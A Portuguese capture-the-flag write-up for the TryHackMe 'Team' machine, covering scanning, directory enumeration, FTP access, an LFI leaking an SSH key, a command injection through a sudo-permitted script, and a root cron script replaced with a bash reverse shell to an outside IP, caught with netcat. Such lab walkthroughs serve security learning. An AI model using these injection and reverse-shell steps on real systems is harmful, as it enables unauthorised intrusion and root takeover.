
# Team

* ### Scan de portas - Verificando quais portas estão abertas.

```bash
rustscan -a 10.10.4.169
```
![image](https://github.com/lufffe/Writeups/assets/90646635/0f01a0be-ebec-49ca-9224-1370ce6dc092)

![image](https://github.com/lufffe/Writeups/assets/90646635/f0c398da-9363-41d6-b6f3-73989400afae)

* ### Verificando o que está rodando nas portas encontradas.
```bash
nmap -A -p 21,22,80 10.10.4.169
```
![image](https://github.com/lufffe/Writeups/assets/90646635/9c6a0cee-6596-415b-9509-899b399ad85f)

* ###  Scan de Arquivos e Diretórios.
```bash
* gobuster dir -u http://team.thm -w ~/common.txt -t 100 --no-error
```
![image](https://github.com/lufffe/Writeups/assets/90646635/60f5f9bd-bd6a-49d2-9e14-999e01b389e8)

* ###  Olhando robots.txt
![image](https://github.com/lufffe/Writeups/assets/90646635/541242b1-9762-4ceb-80a4-13f9e0698252)

* ###  Scan dentro da pasta Scripts.
```bash
gobuster dir -u http://team.thm/scripts/ -w ~/common.txt -t 100 --no-error -x php,html,txt,sh,bkp
```
![image](https://github.com/lufffe/Writeups/assets/90646635/e7c055fa-771a-45a2-b78d-028586aceb60)

* ###  Arquivo encontrado, tem um arquivo old, baixa ele.
![image](https://github.com/lufffe/Writeups/assets/90646635/41aed1cb-b238-4638-b2e0-203af14cf7c5)

* ### Arquivo baixado.
```bash
cat script.old
```
![image](https://github.com/lufffe/Writeups/assets/90646635/17477240-6d7e-4214-9113-6f2968c808cb)

* ### Acessando FTP com a credencial encontrada.
```bash
ftp 10.10.88.254
```
![image](https://github.com/lufffe/Writeups/assets/90646635/606bbafa-17e4-4ac2-9ae3-25c15ac52f76)

* ### Arquivo baixado.
![image](https://github.com/lufffe/Writeups/assets/90646635/faba2a30-b04c-40b8-9cf5-b793fecfd3f3)

* ### Adicione o dev como subdominio do team.thm no arquivo /etc/hosts
```bash
sudo nano /etc/hosts
```
![image](https://github.com/lufffe/Writeups/assets/90646635/8a0ce28e-424d-4085-b06b-64debe527656)



![image](https://github.com/lufffe/Writeups/assets/90646635/1b5a3921-c55e-41da-8b4d-deb0ef39c18c)

* ### Aqui tem um LFI.
 ![image](https://github.com/lufffe/Writeups/assets/90646635/798ce688-0f8a-4457-898f-18e0dcdac771)

* ### Aqui tem uma chave ssh do Dale
![image](https://github.com/lufffe/Writeups/assets/90646635/9926e313-d05e-48fa-adcf-e1dc86a85988)

```bash
┌──(xnv㉿kali)-[~/thm/team]
└─$ ssh -i id_rsa dale@team.thm
```

```bash
dale@TEAM:~$ cat user.txt
```

> #########################################

```bash
dale@TEAM:~$ cat /home/gyles/admin_checks
```

<aside> 💡 #!/bin/bash printf "Reading stats.\n" sleep 1 printf "Reading stats..\n" sleep 1 read -p "Enter name of person backing up the data: " name echo $name >> /var/stats/stats.txt read -p "Enter 'date' to timestamp the file: " error printf "The Date is " $error 2>/dev/null date_save=$(date "+%F-%H-%M") cp /var/stats/stats.txt /var/stats/stats-$date_save.bak printf "Stats have been backed up\n"

</aside>

```bash
dale@TEAM:~$ sudo -l
```
(gyles) NOPASSWD: /home/gyles/admin_checks

```bash
dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
```
Reading stats.
Reading stats..
Enter name of person backing up the data: teste
Enter 'date' to timestamp the file: /bin/bash
<aside> 💡 LINPEAS root admin 65 Jan 17 2021 /usr/local/bin/main_backup.sh
</aside>

```bash
gyles@TEAM:/usr/local/bin$ nano main_backup.sh
```
#!/bin/bash

bash -c "bash -i >& /dev/tcp/10.9.5.85/4455 0>&1"

ESPERA ALGUNS SEGUNDOS QUE O CRONJOB VAI EXECUTAR O SCRIPT

```bash
┌──(xnv㉿kali)-[~]
└─$ nc -lnvp 4455
```

```bash
root@TEAM:~# cat /root/root.txt
```
> #########################################
